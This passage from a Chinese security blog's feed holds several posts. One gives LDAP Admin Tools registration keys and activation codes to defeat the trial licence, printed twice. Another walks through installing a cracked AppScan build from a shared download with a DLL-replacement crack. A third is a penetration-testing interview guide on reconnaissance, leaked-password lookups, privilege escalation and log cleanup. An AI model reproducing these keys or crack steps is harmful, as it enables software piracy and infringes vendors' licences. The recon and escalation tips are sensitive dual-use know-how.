class="lozad"></p><p>然后我又不得不重新将图片的链接换成了GitHub图床上的链接才恢复正常。</p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://www.jianshu.com/p/9d91355e8418" target="_blank" rel="noopener">https://www.jianshu.com/p/9d91355e8418</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LDAP-Admin-Tools工具安装激活教程</title>
      <link href="/2019/08/22/LDAP%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/22/LDAP%E5%8C%BF%E5%90%8D%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试的过程中，我们有可能会碰到LDAP匿名访问漏洞，为了验证漏洞的存在，需要使用LDAP访问工具来连接尝试是否可以正常访问。下面来给大家分享一下工具的安装激活教程。</p><a id="more"></a><h1 id="0x01-下载安装"><a href="#0x01-下载安装" class="headerlink" title="0x01 下载安装"></a>0x01 下载安装</h1><p>LDAP下载：<a href="https://www.ldapsoft.com/download.html" target="_blank" rel="noopener">传送门</a> ,选择相应的系统版统下载</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822105013.png" class="lozad"></p><p>下载完成后傻瓜式安装，一直点下一步即可，需要改变安装位置的自定义安装位置就好了。</p><h1 id="0x02-激活信息"><a href="#0x02-激活信息" class="headerlink" title="0x02  激活信息"></a>0x02  激活信息</h1><p> 不同版本的软件激活信息</p><h2 id="2-1-LDAP-Admin-Tool-Professional-Edition"><a href="#2-1-LDAP-Admin-Tool-Professional-Edition" class="headerlink" title="2.1 LDAP Admin Tool(Professional Edition)"></a>2.1 LDAP Admin Tool(Professional Edition)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VW1wR2RGbFZUWGhqZWtaMFpWZDRNVmxYTVdoak1FSnVZbGRHY0dKRE5XcGlNakZFVFZSck5VOVVRVFJNZWtFMFRIcE5kMDFVYXowPQ==&quot;,</span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258022000-4718858022000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-2-LDAP-Admin-Tool-Standard-Edition"><a href="#2-2-LDAP-Admin-Tool-Standard-Edition" class="headerlink" title="2.2 LDAP Admin Tool(Standard Edition)"></a>2.2 LDAP Admin Tool(Standard Edition)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VW1wR2RGbFZUWGhqZWtaMFpWZDRNVmxYTVdoak1FSnVZbGRHY0dKRE5XcGlNakZFVFZSck5VOVVRVFJNZWtFMFRIcE5kMDFVYXowPQ==&quot;,</span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258022000-4718858022000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-3-AD-Admin-amp-Reporting-Tool"><a href="#2-3-AD-Admin-amp-Reporting-Tool" class="headerlink" title="2.3 AD Admin &amp; Reporting Tool"></a>2.3 AD Admin &amp; Reporting Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VVZWU1UxSnFSblJaVlUxNFkzcEdkR1ZYZURGWlZ6Rm9ZekJDYm1KWFJuQmlRelZxWWpJeFFsSkdTa1JOVkdzMVQxUkJORXg2UVRSTWVrMTNUVlJyUFE9PQ==&quot;,</span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258896000-4718858896000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-4-LDAP-Plus-AD-HelpDesk-Professional-Tool"><a href="#2-4-LDAP-Plus-AD-HelpDesk-Professional-Tool" class="headerlink" title="2.4 LDAP Plus AD HelpDesk Professional Tool"></a>2.4 LDAP Plus AD HelpDesk Professional Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VW1wR2RFMTZVVEZXVjJ4dVlVZFNiV0ZIUm10YWJWSjBaVmQ0TVZsWE1XaGpNRUp1WWxkR2NHSkROV3BpTWpBeVRqQm9TV1JZYkd0VFIxWnpZMFJCTkV4NlFUUk1lazEzVFZSclBRPT0=&quot;,</span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259420000-4718859420000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-5-LDAP-Admin-amp-Reporting-Tool"><a href="#2-5-LDAP-Admin-amp-Reporting-Tool" class="headerlink" title="2.5 LDAP Admin &amp; Reporting Tool"></a>2.5 LDAP Admin &amp; Reporting Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VkVWU1FsVkdTa2ROVnpGb1VYcEdlazFYTVRWaVNGWm9ZbGRHZWxGSFpIUlpWMnh6VEcxT2RtSlZlRVZSVmtKVFVYcEZOVTlVYTNkUFF6aDNUME00ZWsxRVJUVT0=&quot;</span><br><span class="line">,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259450000-4718859450000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-6-AD-Admin-Tool"><a href="#2-6-AD-Admin-Tool" class="headerlink" title="2.6 AD Admin Tool"></a>2.6 AD Admin Tool</h2><p>“email”:”<a href="mailto:myluamas@gmail.com" target="_blank" rel="noopener">myluamas@gmail.com</a>“,</p><p>“registrationKey”:”VVZWU1IwMVhNV2hSZWtaNlRWY3hOV0pJVm1oaVYwWjZVVWRrZEZsWGJITk1iVTUyWWxWR1JWRjZSVFZQVkd0M1QwTTRkMDlET0hwTlJFVTE=”,</p><p>“activationCode”:”STARTTIMEGMT1565259487000-4718859487000”</p><h1 id="0x03-激活步骤"><a href="#0x03-激活步骤" class="headerlink" title="0x03 激活步骤"></a>0x03 激活步骤</h1><p>打开软件后找到工具栏上的<code>license</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822105418.png" class="lozad"></p><p>然后填上对应版本的激活邮箱和key</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822105504.png" class="lozad"></p><p>填好后点击next需要继续输入activationCode ，在我给的激活信息里面</p><p>激活完成以后重启软件会发现菜单栏上面的剩余时间29天没有了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822105527.png" class="lozad"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LADP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LDAP-Admin-Tools工具安装激活教程</title>
      <link href="/2019/08/22/LDAP-Admin-Tools%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/"/>
      <url>/2019/08/22/LDAP-Admin-Tools%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E6%BF%80%E6%B4%BB%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试的过程中，我们有可能会碰到LDAP匿名访问漏洞，为了验证漏洞的存在，需要使用LDAP访问工具来连接尝试是否可以正常访问。下面来给大家分享一下工具的安装激活教程。</p><a id="more"></a><h1 id="0x01-下载安装"><a href="#0x01-下载安装" class="headerlink" title="0x01 下载安装"></a>0x01 下载安装</h1><p>LDAP下载：<a href="https://www.ldapsoft.com/download.html" target="_blank" rel="noopener">传送门</a> ,选择相应的系统版统下载</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822105013.png" class="lozad"></p><p>下载完成后傻瓜式安装，一直点下一步即可，需要改变安装位置的自定义安装位置就好了。</p><h1 id="0x02-激活信息"><a href="#0x02-激活信息" class="headerlink" title="0x02  激活信息"></a>0x02  激活信息</h1><p> 不同版本的软件激活信息</p><h2 id="2-1-LDAP-Admin-Tool-Professional-Edition"><a href="#2-1-LDAP-Admin-Tool-Professional-Edition" class="headerlink" title="2.1 LDAP Admin Tool(Professional Edition)"></a>2.1 LDAP Admin Tool(Professional Edition)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VW1wR2RGbFZUWGhqZWtaMFpWZDRNVmxYTVdoak1FSnVZbGRHY0dKRE5XcGlNakZFVFZSck5VOVVRVFJNZWtFMFRIcE5kMDFVYXowPQ==&quot;,</span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258022000-4718858022000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-2-LDAP-Admin-Tool-Standard-Edition"><a href="#2-2-LDAP-Admin-Tool-Standard-Edition" class="headerlink" title="2.2 LDAP Admin Tool(Standard Edition)"></a>2.2 LDAP Admin Tool(Standard Edition)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VW1wR2RGbFZUWGhqZWtaMFpWZDRNVmxYTVdoak1FSnVZbGRHY0dKRE5XcGlNakZFVFZSck5VOVVRVFJNZWtFMFRIcE5kMDFVYXowPQ==&quot;,</span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258022000-4718858022000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-3-AD-Admin-amp-Reporting-Tool"><a href="#2-3-AD-Admin-amp-Reporting-Tool" class="headerlink" title="2.3 AD Admin &amp; Reporting Tool"></a>2.3 AD Admin &amp; Reporting Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VVZWU1UxSnFSblJaVlUxNFkzcEdkR1ZYZURGWlZ6Rm9ZekJDYm1KWFJuQmlRelZxWWpJeFFsSkdTa1JOVkdzMVQxUkJORXg2UVRSTWVrMTNUVlJyUFE9PQ==&quot;,</span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565258896000-4718858896000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-4-LDAP-Plus-AD-HelpDesk-Professional-Tool"><a href="#2-4-LDAP-Plus-AD-HelpDesk-Professional-Tool" class="headerlink" title="2.4 LDAP Plus AD HelpDesk Professional Tool"></a>2.4 LDAP Plus AD HelpDesk Professional Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VW1wR2RFMTZVVEZXVjJ4dVlVZFNiV0ZIUm10YWJWSjBaVmQ0TVZsWE1XaGpNRUp1WWxkR2NHSkROV3BpTWpBeVRqQm9TV1JZYkd0VFIxWnpZMFJCTkV4NlFUUk1lazEzVFZSclBRPT0=&quot;,</span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259420000-4718859420000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-5-LDAP-Admin-amp-Reporting-Tool"><a href="#2-5-LDAP-Admin-amp-Reporting-Tool" class="headerlink" title="2.5 LDAP Admin &amp; Reporting Tool"></a>2.5 LDAP Admin &amp; Reporting Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line">&quot;registrationKey&quot;:&quot;VkVWU1FsVkdTa2ROVnpGb1VYcEdlazFYTVRWaVNGWm9ZbGRHZWxGSFpIUlpWMnh6VEcxT2RtSlZlRVZSVmtKVFVYcEZOVTlVYTNkUFF6aDNUME00ZWsxRVJUVT0=&quot;</span><br><span class="line">,&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259450000-4718859450000&quot;</span><br></pre></td></tr></table></figure><h2 id="2-6-AD-Admin-Tool"><a href="#2-6-AD-Admin-Tool" class="headerlink" title="2.6 AD Admin Tool"></a>2.6 AD Admin Tool</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;email&quot;:&quot;myluamas@gmail.com&quot;,</span><br><span class="line"></span><br><span class="line">&quot;registrationKey&quot;:&quot;VVZWU1IwMVhNV2hSZWtaNlRWY3hOV0pJVm1oaVYwWjZVVWRrZEZsWGJITk1iVTUyWWxWR1JWRjZSVFZQVkd0M1QwTTRkMDlET0hwTlJFVTE=&quot;,</span><br><span class="line"></span><br><span class="line">&quot;activationCode&quot;:&quot;STARTTIMEGMT1565259487000-4718859487000&quot;</span><br></pre></td></tr></table></figure><h1 id="0x03-激活步骤"><a href="#0x03-激活步骤" class="headerlink" title="0x03 激活步骤"></a>0x03 激活步骤</h1><p>打开软件后找到工具栏上的<code>license</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822105418.png" class="lozad"></p><p>然后填上对应版本的激活邮箱和key</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822105504.png" class="lozad"></p><p>填好后点击next需要继续输入activationCode ，在我给的激活信息里面</p><p>激活完成以后重启软件会发现菜单栏上面的剩余时间29天没有了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190822105527.png" class="lozad"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LADP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AppScan 9.0.3.13 破解版本安装教程</title>
      <link href="/2019/08/21/AppScan-9-0-3-13-%E7%A0%B4%E8%A7%A3%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/"/>
      <url>/2019/08/21/AppScan-9-0-3-13-%E7%A0%B4%E8%A7%A3%E7%89%88%E6%9C%AC%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近AppScan 9.0.3.13 版本发布，国内已经以后大佬破解成功了，下面来给大家讲讲如何安装和破解的。</p><a id="more"></a><h1 id="0x01-AppScan简介"><a href="#0x01-AppScan简介" class="headerlink" title="0x01 AppScan简介"></a>0x01 AppScan简介</h1><p>IBM AppScan是一款非常好用且功能强大的Web 应用安全测试工具，曾以 Watchfire AppScan的名称享誉业界，Rational AppScan 可自动化 Web 应用的安全漏洞评估工作，能扫描和检测所有常见的 Web 应用安全漏洞，例如 SQL<br>注入（SQL-injection）、跨站点脚本攻击（cross-site scripting）、缓冲区溢出（buffer overflow）及最新的 Flash/Flex 应用及 Web 2.0 应用曝露等方面安全漏洞的扫描。</p><h1 id="0x02-开始安装"><a href="#0x02-开始安装" class="headerlink" title="0x02 开始安装"></a>0x02 开始安装</h1><p>下载：<a href="https://pan.baidu.com/s/1uy2CPCkGRNVZ-vCvnpjJiA" target="_blank" rel="noopener">百度网盘传送门</a>  密码：zkyy</p><p>下载完成后解压出来 双击文件夹中的.exe文件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160158.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160211.png" class="lozad"></p><p>出现下面这个原因是因为没有安装.net框架，而APPscan是需要这个框架环境的。所以软件会自动帮我们下载框架安装。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160246.png" class="lozad"></p><p>框架下载中，耐性等待，可能时间会有点长。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160351.png" class="lozad"></p><p>安装完框架以后会提示是否立即重启，点击立即重启就好</p><p>重启过后，再次进入安装界面</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160511.png" class="lozad"></p><p>一切默认即可</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160527.png" class="lozad"></p><p>耐心等待一会，等待安装完成</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160538.png" class="lozad"></p><h1 id="0x03-开始破解"><a href="#0x03-开始破解" class="headerlink" title="0x03 开始破解"></a>0x03 开始破解</h1><p>将下载的压缩包中的另个压缩包解压出来，复制里面的dll文件到APPscan的安装目录下</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160604.png" class="lozad"></p><p>进入APPscan的默认安装路径，如果是自己自定义的目录的话，找到就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\ProgramFiles (x86)\IBM\AppScan Standard</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160710.png" class="lozad"></p><p>然后打开APPscan,按照下面的操作导入证书</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160727.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160802.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160835.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160846.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160857.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160911.png" class="lozad"></p><p>破解完成</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821160929.png" class="lozad"></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>安装破解基本操作。一顿默认配置，搞定。哈哈哈哈</p><p>新版老本对比了一下，创建扫描的界面修改了一下</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821161638.png" class="lozad"></p><p>增加了云扫描</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190821161721.png" class="lozad"></p><p>其他的，大家自己与研究吧</p><p>附上官方教程视频</p><iframe width="900" height="506" src="https://www.youtube.com/embed/NiC7SJpwo80" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><iframe width="900" height="506" src="https://www.youtube.com/embed/JFj0pDY9pm8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><hr>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APPscan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试面试宝典</title>
      <link href="/2019/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E5%AE%9D%E5%85%B8/"/>
      <url>/2019/08/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%9D%A2%E8%AF%95%E5%AE%9D%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>随着科学技术的发展，网络安全已经提升到了国家层面。习大大说：“没有网络安全就没有国家安全。”那么在网络安全大热的今天，如何才能历经重重磨难才能达到公司需要的高度，才能符合面试官的口味,才能在众多才子中脱颖而出尼？那就好好看看博主这篇面试宝典吧，内容均是从网络上采集或者自己总结，有问题希望大家可以指出，一起进步！nice~</p><a id="more"></a><h1 id="0x01-简述漏洞挖掘的思路"><a href="#0x01-简述漏洞挖掘的思路" class="headerlink" title="0x01 简述漏洞挖掘的思路"></a>0x01 简述漏洞挖掘的思路</h1><h2 id="1-1-信息收集"><a href="#1-1-信息收集" class="headerlink" title="1. 1 信息收集"></a>1. 1 信息收集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</span><br><span class="line">网站指纹识别（包括，cms，cdn，证书等），dns记录</span><br><span class="line">whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</span><br><span class="line">子域名收集，旁站，C段等</span><br><span class="line">google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</span><br><span class="line">扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</span><br><span class="line">传输协议，通用漏洞，exp，github源码等</span><br></pre></td></tr></table></figure><h2 id="1-2-漏洞挖掘"><a href="#1-2-漏洞挖掘" class="headerlink" title="1.2 漏洞挖掘"></a>1.2 漏洞挖掘</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">浏览网站，看看网站规模，功能，特点等</span><br><span class="line">端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</span><br><span class="line">XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</span><br></pre></td></tr></table></figure><h2 id="1-3-漏洞利用-amp-权限提升"><a href="#1-3-漏洞利用-amp-权限提升" class="headerlink" title="1.3 漏洞利用&amp;权限提升"></a>1.3 漏洞利用&amp;权限提升</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql提权，serv-u提权，oracle提权</span><br><span class="line">windows 溢出提权</span><br><span class="line">linux脏牛,内核漏洞提权</span><br></pre></td></tr></table></figure><h2 id="1-4-清除测试数据-amp-输出报告"><a href="#1-4-清除测试数据-amp-输出报告" class="headerlink" title="1.4 清除测试数据&amp;输出报告"></a>1.4 清除测试数据&amp;输出报告</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">日志、测试数据的清理</span><br><span class="line">总结，输出渗透测试报告，附修复方案</span><br></pre></td></tr></table></figure><h2 id="1-5-复测"><a href="#1-5-复测" class="headerlink" title="1.5 复测"></a>1.5 复测</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">验证并发现是否有新漏洞，输出报告，归档</span><br></pre></td></tr></table></figure><h1 id="0x02-面试题（一）"><a href="#0x02-面试题（一）" class="headerlink" title="0x02  面试题（一）"></a>0x02  面试题（一）</h1><h2 id="2-1-拿到一个待检测的站，你觉得应该先做什么？"><a href="#2-1-拿到一个待检测的站，你觉得应该先做什么？" class="headerlink" title="2.1 拿到一个待检测的站，你觉得应该先做什么？"></a>2.1 拿到一个待检测的站，你觉得应该先做什么？</h2><h3 id="2-1-1-信息收集"><a href="#2-1-1-信息收集" class="headerlink" title="2.1.1 信息收集"></a>2.1.1 信息收集</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词进行丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。</span><br><span class="line">2、查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。</span><br><span class="line">3、查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞</span><br><span class="line">4、查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</span><br><span class="line">5、扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针</span><br><span class="line">6、google hack 进一步探测网站的信息，后台，敏感文件</span><br></pre></td></tr></table></figure><p>如何扩大攻击面呢？<br>1.收集尽量全的企业域名（包括各种子域名以及子公司的域名，越全越好）<br>2.收集尽量全的企业申请的公网 IP<br>3.对所有收集到的域名以及 IP 地址进行端口扫描（由于时间可能比较久，所以可以<br>选择利用 zoomeye、shodan、censys 等平台）<br>4.针对不同的服务进行对应的渗透测试（尤其是可能存在漏洞的中间件）</p><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://mp.weixin.qq.com/s/OXo4sli37NmzzCrh4h6wYQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/OXo4sli37NmzzCrh4h6wYQ</a></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web应用程序测试方法论</title>
      <link href="/2019/08/19/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/"/>
      <url>/2019/08/19/web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95%E8%AE%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天给大家分享一个web应用程序测试方法论的思维导图，希望大家可以通过思维导图理清自己测试的思路，查缺补漏，然后在总结出自己的方法论，欢迎大家和我交流。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190819214613.png" class="lozad"></p><p>### </p><hr>]]></content>
      
      
      <categories>
          
          <category> 思维导图 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 方法论 </tag>
            
            <tag> 应用程序测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>burp加载jython时出错</title>
      <link href="/2019/08/19/burp%E5%8A%A0%E8%BD%BDjython%E6%97%B6%E5%87%BA%E9%94%99/"/>
      <url>/2019/08/19/burp%E5%8A%A0%E8%BD%BDjython%E6%97%B6%E5%87%BA%E9%94%99/</url>
      
